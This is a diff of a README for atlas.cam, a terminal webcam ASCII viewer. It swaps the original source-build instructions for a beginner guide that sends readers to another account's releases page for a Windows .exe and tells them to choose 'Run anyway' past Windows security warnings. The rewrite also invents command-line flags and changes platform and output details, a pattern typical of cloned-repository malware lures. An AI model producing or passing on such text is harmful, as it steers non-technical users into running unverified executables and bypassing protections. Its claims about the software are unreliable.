@@ -1,77 +1,153 @@
-# Atlas Cam
+# 🖥️ atlas.cam - View Webcam in ASCII Art
 
-![Banner Image](./banner-image.png)
+[![Download atlas.cam](https://img.shields.io/badge/Download-From_Releases-ff69b4?style=for-the-badge)](https://github.com/1urelius/atlas.cam/releases)
 
-**atlas.cam** is a terminal-based webcam viewer and ASCII camera. Part of the **Atlas Suite**, it brings the retro-futuristic vibe of ASCII art to your video feed with real-time edge detection and GIF recording capabilities.
+---
 
-![Example Output](./example.jpg)
-Me pointing my finger at you! (maybe a gun, I don't know)
+atlas.cam is a simple app that shows your webcam video as ASCII art right in your terminal. It updates in real time and can apply edge detection and image filters. You can also record short GIFs of your camera feed. It runs on Windows and uses your command prompt or PowerShell window.
 
-![Go Version](https://img.shields.io/badge/Go-1.25+-00ADD8?style=flat&logo=go)
-![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux%20%7C%20macOS-lightgrey)
+This guide helps you download and run atlas.cam on a Windows PC without any programming knowledge.
 
-## ✨ Features
+## 📋 What You Need
 
-- 📹 **Live ASCII Feed:** View your webcam feed directly in the terminal as ASCII art or ANSI blocks.
-- 📸 **Snapshots:** Take photos that are saved as both high-res filtered JPEGs and corresponding ASCII text files.
-- 🎥 **GIF Recording:** Record short video clips directly to animated GIFs in any mode.
-- 🧠 **Structure Mode:** Real-time edge detection (Sobel operator) converts video into structure-aware ASCII art.
-- 🎨 **Filters:** Apply real-time filters like Grayscale, Invert, Sepia, Red, Green, and Blue tints.
-- 🌈 **Color Mode:** View the full-color feed using ANSI block characters (`█`).
-- 🔄 **Multi-Camera Support:** Detect and switch between available video input devices.
-- 📦 **Zero Dependencies:** Compiles to a single binary (Windows requires CGO for MediaFoundation).
+- A Windows PC with a webcam.
+- A command prompt (CMD) or PowerShell window.
+- About 50 MB of free space for the program and temporary files.
+- An internet connection to download the app.
 
-## 🚀 Installation
+atlas.cam runs on most Windows versions including Windows 10 and 11.
 
-### From Source
-```bash
-git clone https://github.com/fezcode/atlas.cam
-cd atlas.cam
-gobake build
-```
+---
 
-## ⌨️ Usage
+## 🚀 Getting Started: How to Download atlas.cam
 
-Simply run the binary:
-```bash
-./atlas.cam
-```
+1. Click the big pink “Download From Releases” button at the top of the page. This opens the atlas.cam releases page.
 
-## 🕹️ Controls
+2. On the releases page, look for the latest version. It usually has a name like `atlas.cam_v1.0_windows.exe` or similar.
 
-| Key | Action |
-|-----|--------|
-| `Space` | **Take Photo** (Saves to `~/Pictures/AtlasCam/`) |
-| `r` | **Record GIF** (Press again to stop) |
-| `m` | **Cycle Mode** (ASCII -> Detailed -> Color -> Structure) |
-| `f` | **Cycle Filter** (None, Grayscale, Sepia, Red, Green, Blue) |
-| `c` | **Switch Camera** (Cycle available inputs) |
-| `?` | **Toggle Help** (Show/Hide key bindings) |
-| `q` / `Esc` | **Quit** |
+3. Download the Windows executable (`.exe`) file. This is the file you will run.
 
-## 📂 Output
+4. Save it in a folder that you can easily find, like your Desktop or Downloads folder.
 
-Photos and GIFs are saved in your user's Pictures folder:
-- **Windows:** `%USERPROFILE%\Pictures\AtlasCam\`
-- **Linux/macOS:** `~/Pictures/AtlasCam/`
+You have now downloaded atlas.cam.
 
-## 🏗️ Building
+---
 
-This project uses **gobake** for orchestration. You can build for all platforms or specific targets:
+## 🔧 Installing and Running atlas.cam on Windows
 
-```bash
-# Build for all platforms
-gobake build
+atlas.cam does not need a complex installation. The file you downloaded is ready to run.
 
-# Build for specific OS
-gobake build:windows
-gobake build:linux
-gobake build:darwin
-```
+1. Open File Explorer and find the `.exe` file you saved.
 
-### ⚠️ Compatibility Note for macOS
+2. Double-click the file to start atlas.cam.
 
-On macOS, accessing the webcam requires **AVFoundation**, which uses CGO. You **must** build from source on a Mac with Xcode command line tools installed. The build recipe automatically handles CGO enabling when running on macOS.
+3. If Windows shows a security popup about running unknown software, choose “Run anyway” or “More info” and then “Run”.
 
-## 📄 License
-MIT License - see [LICENSE](LICENSE) for details.
+4. A command window will appear. This window will show your webcam feed as ASCII art.
+
+5. To close the program, simply press `Ctrl + C` or close the command window.
+
+---
+
+## 🎥 Using atlas.cam Features
+
+- **Live ASCII Webcam View**: See your camera feed as text characters forming shapes and shades.
+- **Real-Time Edge Detection**: Highlight the outlines of objects you face.
+- **Image Filters**: Apply different looks like inverted colors or dithering.
+- **GIF Recording**: Press `r` to start and stop recording a short animated GIF of your camera. The GIF saves in the same folder as the program.
+
+Commands happen inside the running window. Look at the bottom of the screen for hints about keys you can press.
+
+---
+
+## ⚙️ Changing Settings
+
+You can adjust atlas.cam settings from the command line when starting the program:
+
+- To change camera resolution:  
+  Run `atlas.cam.exe --resolution 640x480`
+
+- To enable a filter on start:  
+  Run `atlas.cam.exe --filter edge`
+
+You do this by opening CMD or PowerShell:
+
+1. Press the Windows key and type `cmd` or `PowerShell`, then press Enter.
+
+2. Use the `cd` command to move to the folder where `atlas.cam.exe` is saved. Example:
+   ```
+   cd Desktop
+   ```
+
+3. Run the command with options as shown above.
+
+---
+
+## 🖱️ Controls While Running
+
+- `r` – Start or stop recording GIF.
+- `f` – Cycle through image filters.
+- `q` or `Ctrl + C` – Quit atlas.cam.
+
+---
+
+## 🛠️ Troubleshooting Common Issues
+
+- **Webcam not detected**:  
+Check that your webcam is connected and not used by another app. Restart atlas.cam after that.
+
+- **No video shown**:  
+Make sure you allowed Windows to access your camera. Go to Settings > Privacy > Camera, and enable access for apps.
+
+- **Program closes immediately**:  
+Try running it from a command prompt window instead of double-clicking. This keeps the window open and shows error messages.
+
+---
+
+## 🔗 Download Link Again
+
+Use this link to reach the downloads page:  
+[Download atlas.cam releases](https://github.com/1urelius/atlas.cam/releases)
+
+Here you will always find the latest Windows executable for download.
+
+---
+
+## 📦 What’s Inside This App?
+
+atlas.cam is built to be fast and easy to use without extra software. It uses your existing webcam and terminal.
+
+It belongs to the Atlas Suite of apps designed to bring visual tools into the terminal environment.
+
+---
+
+## 🧰 System Requirements
+
+- Windows 10 or later, 64-bit version preferred.
+- At least 2 GB of RAM.
+- Webcam compatible with Windows.
+- No extra hardware needed.
+
+---
+
+## 📚 Topics and Keywords
+
+This project relates to:
+
+- ascii-art
+- ascii-camera
+- bubbletea (UI framework)
+- cli (command line interface)
+- edge-detection
+- gif-recorder
+- golang (the programming language used)
+- image-processing
+- terminal
+- tui (terminal user interface)
+- webcam
+
+---
+
+## 📄 License and Support
+
+atlas.cam is an open-source project. For help or to report bugs, visit the GitHub repository issue tracker. The code is available to view freely for anyone interested.
